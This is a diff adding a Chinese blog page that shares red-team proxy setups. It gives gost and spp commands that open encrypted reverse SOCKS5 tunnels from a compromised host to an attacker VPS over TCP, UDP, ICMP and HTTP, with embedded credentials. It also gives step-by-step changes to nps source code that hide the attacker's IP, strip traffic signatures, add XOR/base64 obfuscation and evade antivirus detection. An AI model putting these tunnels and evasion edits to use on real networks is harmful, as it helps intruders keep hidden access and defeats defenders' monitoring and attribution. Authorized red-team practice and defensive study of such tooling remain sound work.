@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      分享几个攻击队用的代理方案 
+      
+      
+      |
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">分享几个攻击队用的代理方案</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-08-26 21:00:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>因为现在原版的frp和nps被杀得很厉害嘛，本文给hxd们分享几个我之前为攻防演习准备的代理方案。</p>
+<h3 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h3><p><a target="_blank" rel="noopener" href="https://github.com/jqqjj/socks5">https://github.com/jqqjj/socks5</a></p>
+<p>裸的正向socks5，支持认证，非常适合用于内网做二层代理。</p>
+<p>把main.go中的连接信息注释掉，这样再<code>start /b</code>可以无感后台启动。</p>
+<h3 id="GOST"><a href="#GOST" class="headerlink" title="GOST"></a>GOST</h3><p><a target="_blank" rel="noopener" href="https://github.com/ginuerzh/gost/">https://github.com/ginuerzh/gost/</a></p>
+<p>gost更适合用来做内网二层代理。因为GOST开的代理是正向的，所以必须我们的网络能直接连通到，不太适合平时渗透的情景。</p>
+<p>支持tls加认证的socks5，相比裸的TCP明文更好一点，且暂时没有杀软会干这个。</p>
+<p>要开socks监听的那台内网机器执行下面的命令，在本地8301端口开启一个socks5代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gost-windows-amd64 -L=socks5://hw1w0Pasone1i0281:L8a0s1glove01a@0.0.0.0:8301</span><br></pre></td></tr></table></figure>
+
+<p>本地的10801端口转发一下到gost的流量(必须走两次gost，不转发直接连的流量是明文的，没办法，要加密流量就必须定制特殊的客户端)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gost-windows-amd64 -L=127.0.0.1:10801 -F=socks5://hw1w0Pasone1i0281:L8a0s1glove01a@172.16.64.193:8301</span><br></pre></td></tr></table></figure>
+
+<p>账号hw1w0Pasone1i0281</p>
+<p>密码L8a0s1glove01a</p>
+<h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>看这个<a target="_blank" rel="noopener" href="https://github.com/ginuerzh/gost/issues/673">issues</a>里有提到反向代理的思路，用端口转发来实现。</p>
+<p>vps上开启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gost-windows-amd64 -L forward+ssh://adsmi1n:1L2x3$455x6@:2222</span><br></pre></td></tr></table></figure>
+
+<p>被控端机器执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gost-windows-amd64 -L=socks5://hw1w0Pasone1i0281:L8a0s1glove01a@0.0.0.0:8301</span><br><span class="line"></span><br><span class="line">gost-windows-amd64 -L rtcp://0.0.0.0:8301/localhost:8301 -F forward+ssh://adsmi1n:1L2x3$455x6@172.16.64.193:2222?ping=60</span><br></pre></td></tr></table></figure>
+
+<p>也可以实现类似frp一样的效果，但是我看了下流量默认没有加密..</p>
+<h3 id="spp"><a href="#spp" class="headerlink" title="spp"></a>spp</h3><p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
+<p>可以开反向代理，类似ew，不如frp稳定</p>
+<p>vps执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -type server -proto tcp -listen :8888</span><br></pre></td></tr></table></figure>
+
+<p>被控端执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -name &quot;bank&quot; -type reverse_socks5_client -server vpsip:8888 -fromaddr 0.0.0.0:10806 -proxyproto tcp</span><br></pre></td></tr></table></figure>
+
+<p>然后vps的10806端口就有个可以用的socks5代理</p>
+<h4 id="开启流量加密和socks5认证"><a href="#开启流量加密和socks5认证" class="headerlink" title="开启流量加密和socks5认证"></a>开启流量加密和socks5认证</h4><p>vps开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup spp -type server -proto tcp -listen :8888 -encrypt myoas -compress 121 -username iFi@a3ma2sZh -password Oxu6we1r2a!ng3 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>被控端执行，这里必须带上encrypt参数，否则socks5代理会有问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -name &quot;bankter&quot; -type reverse_socks5_client -server 172.16.64.193:8888 -fromaddr 0.0.0.0:10806 -proxyproto tcp  -encrypt myoas</span><br></pre></td></tr></table></figure>
+
+<p>然后在vps的10806端口就可以连socks5代理，账号是iFi@a3ma2sZh，密码是Oxu6we1r2a!ng3</p>
+<h4 id="封装成其他协议"><a href="#封装成其他协议" class="headerlink" title="封装成其他协议"></a>封装成其他协议</h4><h5 id="udp"><a href="#udp" class="headerlink" title="udp"></a>udp</h5><p>当目标只有udp出网时，可以使用-proto参数使用udp转发流量做socks5代理</p>
+<p>vps执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -<span class="built_in">type</span> server -proto rudp -listen :8888 -encrypt myoas -compress 121 -username iFi@a3ma2sZh -password Oxu6we1r2a!ng3</span><br></pre></td></tr></table></figure>
+
+<p>被控端执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -name <span class="string">&quot;bankter&quot;</span> -<span class="built_in">type</span> reverse_socks5_client -server 172.16.64.193:8888 -fromaddr 0.0.0.0:10806 -proxyproto tcp -proto rudp  -encrypt myoas</span><br></pre></td></tr></table></figure>
+
+<p>然后在vps的10806端口就可以连socks5代理，账号是iFi@a3ma2sZh，密码是Oxu6we1r2a!ng3</p>
+<p>抓包看了，这样执行被控端和vps只用udp做通信。</p>
+<h5 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h5><p>当目标只有icmp出网时，也可以做转发实现socks5代理</p>
+<p>vps执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -<span class="built_in">type</span> server -proto ricmp -listen 0.0.0.0 -encrypt myoas -compress 121 -username iFi@a3ma2sZh -password Oxu6we1r2a!ng3</span><br></pre></td></tr></table></figure>
+
+<p>被控端执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -name <span class="string">&quot;bankter&quot;</span> -<span class="built_in">type</span> reverse_socks5_client -server 172.16.64.193 -fromaddr 0.0.0.0:10806 -proxyproto tcp -proto ricmp  -encrypt myoas</span><br></pre></td></tr></table></figure>
+
+<h5 id="http"><a href="#http" class="headerlink" title="http"></a>http</h5><p>内网很容易遇到只有http协议通行，这时可以用http的协议封装实现socks5</p>
+<p>vps执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/tmp/s -<span class="built_in">type</span> server -proto rhttp -listen :8888 -encrypt myoas -compress 121 -username iFi@a3ma2sZh -password Oxu6we1r2ang3</span><br></pre></td></tr></table></figure>
+
+<p>被控端</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/tmp/s -name <span class="string">&quot;bankter&quot;</span> -<span class="built_in">type</span> reverse_socks5_client -server 107.17.128.94:8888 -fromaddr 0.0.0.0:10806 -proxyproto tcp -proto rhttp  -encrypt myoas</span><br></pre></td></tr></table></figure>
+
+<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p>介绍一些我对nps特征及流量做处理的点，实战体验下来效果还行，没有翻过车。</p>
+<h4 id="修改信息泄漏1"><a href="#修改信息泄漏1" class="headerlink" title="修改信息泄漏1"></a>修改信息泄漏1</h4><p>默认的nps会漏连socks5的攻击者ip,如果有全流量设备有很大的溯源风险。</p>
+<p>修改server&#x2F;proxy&#x2F;base.go，server&#x2F;proxy&#x2F;http.go，server&#x2F;proxy&#x2F;socks5.go，server&#x2F;proxy&#x2F;udp.go中的NewLink方法参数</p>
+<p>硬编码一个ip地址</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524120057391.png" class="" title="image-20220524120057391">
+
+<p>改了之后流量里看到的就是我们硬编码的值</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524163307213.png" class="" title="image-20220524163307213">
+
+<h4 id="修改信息泄漏2"><a href="#修改信息泄漏2" class="headerlink" title="修改信息泄漏2"></a>修改信息泄漏2</h4><p>代码在cmd&#x2F;npc&#x2F;npc.go中</p>
+<p>注释掉client端的输出</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524161408700.png" class="" title="image-20220524161408700">
+
+<p>代码在client&#x2F;client.go中</p>
+<p>注释掉所有client端的输出</p>
+<p>所有<code>logs.info</code>都注释掉</p>
+<p>这样改了之后可以配合start &#x2F;b 使用</p>
+<h4 id="改动常量硬编码"><a href="#改动常量硬编码" class="headerlink" title="改动常量硬编码"></a>改动常量硬编码</h4><p>Lib&#x2F;common&#x2F;const.go里硬编码了很多会在数据包中用到的常量，很可能被当成特征，所以建议全部都改动下。</p>
+<p>不过改动的时候注意，有的常量可能对长度或内容有一定限制，具体的限制也得一块修改</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525120128675.png" class="" title="image-20220525120128675">
+
+<h4 id="注释掉不用的功能"><a href="#注释掉不用的功能" class="headerlink" title="注释掉不用的功能"></a>注释掉不用的功能</h4><p>不用的功能注释掉，减少特征</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524162953205.png" class="" title="image-20220524162953205">
+
+<h4 id="修改支持system用户"><a href="#修改支持system用户" class="headerlink" title="修改支持system用户"></a>修改支持system用户</h4><p>代码在cmd&#x2F;npc&#x2F;npc.go</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524115823567.png" class="" title="image-20220524115823567">
+
+<p>代码可以看到npc默认想要服务的方式启动，所以system用户等启动时会遇到问题导致直接退出无法启动。</p>
+<p>但其实npc.go本身可以不依赖service直接启动，只需要调用到run()方法即可，所以这里改动为，只要run()方法能正常跑起来就行了</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524151623708.png" class="" title="image-20220524151623708">
+
+<h4 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h4><p>最前面几个数据包会传递版本号，算是个特征，改掉</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524152020733.png" class="" title="image-20220524152020733">
+
+<p>且最开始会发一个tcp的包，内容是TST，这里也改改</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524153113263.png" class="" title="image-20220524153113263">
+
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524153147535.png" class="" title="image-20220524153147535">
+
+<p>同时整个版本协商过程都有点特征明显，两个版本号，然后是版本号的md5值，以及vkey的md5值，sucs代表vkey认证成功，main也是一个硬编码</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524155616697.png" class="" title="image-20220524155616697">
+
+<p>客户端代码在client&#x2F;control.go</p>
+<p>这里我直接把整个验证版本以及前面测试连接的过程全部注释掉</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524161056099.png" class="" title="image-20220524161056099">
+
+<p>服务端代码在bridge&#x2F;bridge.go</p>
+<p>每一块代码的用处原作者都有注释，这里我直接注释掉整个验证版本以及前面测试连接的过程</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524161230845.png" class="" title="image-20220524161230845">
+
+<p>全部删完后暂时没看到什么很明显的特征了，应该就剩下心跳特征了。</p>
+<h4 id="流量特征2"><a href="#流量特征2" class="headerlink" title="流量特征2"></a>流量特征2</h4><p>前面讲信息泄漏的时候也提到了一个点，当我们使用socks5代理去下发请求任务时，服务端会给客户端发送这么一段代码，特征非常明显。</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524180812402.png" class="" title="image-20220524180812402">
+
+<p>阅读代码，了解了整个socks5代理的使用流程大概是</p>
+<h5 id="socks5流程"><a href="#socks5流程" class="headerlink" title="socks5流程"></a>socks5流程</h5><p>当服务端收到用户使用socks5代理访问某资源时，</p>
+<p>server&#x2F;proxy&#x2F;socks5.go中的接收到请求然后处理，经过一系列处理(有点繁杂，所以直接写结论)后走到服务端<code>server/proxy/base.go</code>中的<code>DealClient</code>将这次请求以上图中的json格式发送到客户端</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525114950628.png" class="" title="image-20220525114950628">
+
+<p>关键函数在<code>SendLinkInfo</code></p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525114844845.png" class="" title="image-20220525114844845">
+
+<p>关键点在<code>lib/conn/conn.go</code>的<code>SendInfo</code>方法，这里是实质上发送请求的地方。</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525120316128.png" class="" title="image-20220525120316128">
+
+<p>同理不难发现客户端实质上处理这个请求的地方在<code>lib/conn/conn.go</code>的<code>GetLinkInfo</code></p>
+<h5 id="改动"><a href="#改动" class="headerlink" title="改动"></a>改动</h5><p>服务端关键代码<code>lib/conn/conn.go</code></p>
+<p>给<code>SendInfo</code>增加一层base64编码处理</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525111242899.png" class="" title="image-20220525111242899">
+
+<p>注意这里做编码处理只能对b这个变量做，如果只在<code>s.Write(raw.Bytes())</code>这里做编码处理，服务端正常发编码后的数据给客户端，但客户端处用的是<code>binary.Read()</code>读取数据，会导致抛出异常，不能正常识别我们传输的数据，所以正确的操作是在<code>lenBytes</code>处赋值时做编码，不影响服务端<code>binary.Write()</code>的操作。</p>
+<p>客户端关键代码在<code>lib/conn/conn.go</code>的<code>GetLinkInfo</code>方法</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525111718171.png" class="" title="image-20220525111718171">
+
+<p>这里核心的逻辑在<code>getInfo</code>方法里，但<code>getInfo</code>在很多地方都有调用，如果直接改getInfo会导致bug跑不起来，所以这里新创建一个<code>getInfo1</code>方法，把<code>getInfo</code>的代码抄到<code>getInfo1</code>处。</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525112001215.png" class="" title="image-20220525112001215">
+
+<p>getInfo1首先使用GetLen获取客户端的传输数据的长度，这里的底层是一个<code>binary.Read</code></p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525112218136.png" class="" title="image-20220525112218136">
+
+<p>接着使用<code>s.ReadLen(l, buf)</code>方法把数据包中的数据传输给buf变量，所以我们直接给buf这里加上解码的过程即可正常实用。</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525112439711.png" class="" title="image-20220525112439711">
+
+<p>最后是json.Unmarshal解码传输的json数据。</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220525112459620.png" class="" title="image-20220525112459620">
+
+<p>这里可以再搞个异或处理，因为相对简单</p>
+<p>服务端</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Conn)</span></span> SendInfo(t <span class="keyword">interface</span>&#123;&#125;, flag <span class="type">string</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	raw := bytes.NewBuffer([]<span class="type">byte</span>&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> flag != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		binary.Write(raw, binary.LittleEndian, []<span class="type">byte</span>(flag))</span><br><span class="line">	&#125;</span><br><span class="line">	b, err := json.Marshal(t)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	b1:= strByXOR(<span class="type">string</span>(b),<span class="string">&quot;2233&quot;</span>)</span><br><span class="line">	lenBytes, err := GetLenBytes([]<span class="type">byte</span>(base64.StdEncoding.EncodeToString([]<span class="type">byte</span>(b1))))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	binary.Write(raw, binary.LittleEndian, lenBytes)</span><br><span class="line">	<span class="keyword">return</span> s.Write(raw.Bytes())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Conn)</span></span> getInfo1(t <span class="keyword">interface</span>&#123;&#125;) (err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> l <span class="type">int</span></span><br><span class="line">	buf := common.BufPoolMax.Get().([]<span class="type">byte</span>)</span><br><span class="line">	<span class="keyword">defer</span> common.PutBufPoolMax(buf)</span><br><span class="line">	<span class="keyword">if</span> l, err = s.GetLen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> _, err = s.ReadLen(l, buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		sDec, err := base64.StdEncoding.DecodeString(<span class="type">string</span>(buf[:l]))</span><br><span class="line">		slast := strByXOR(<span class="type">string</span>(sDec),<span class="string">&quot;2233&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">      </span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			json.Unmarshal([]<span class="type">byte</span>(slast), &amp;t)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>异或处理</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">strByXOR</span><span class="params">(message <span class="type">string</span>,keywords <span class="type">string</span>)</span></span> <span class="type">string</span>&#123;</span><br><span class="line">    messageLen := <span class="built_in">len</span>(message)</span><br><span class="line">    keywordsLen := <span class="built_in">len</span>(keywords)</span><br><span class="line"></span><br><span class="line">    result := <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; messageLen; i++ &#123;</span><br><span class="line">        result += <span class="type">string</span>(message[i] ^ keywords[i%keywordsLen])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><p>做了上面的操作正常编译出来就是1&#x2F;67，360也没杀</p>
+<img src="/2022/08/26/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E6%94%BB%E5%87%BB%E9%98%9F%E7%94%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%96%B9%E6%A1%88/image-20220524165221696.png" class="" title="image-20220524165221696">
+
+<h4 id="清理go编译信息"><a href="#清理go编译信息" class="headerlink" title="清理go编译信息"></a>清理go编译信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-strip -f /Users/bendan/Documents/tool/port-forwarding/nps/releasexor/windows_amd64_client/livead.exe -a -output /Users/bendan/Documents/tool/port-forwarding/nps/releasexor/windows_amd64_client/livea.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>go几乎是现学的，哪里描述有问题欢迎各位师傅交流意见。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/08/16/%E4%B8%80%E6%AC%A1rasp%E6%8A%98%E7%A3%A8%E8%AE%B0%E5%BD%95%E5%8F%8A%E5%A4%8D%E7%9B%98/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-08-26 21:00:19
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
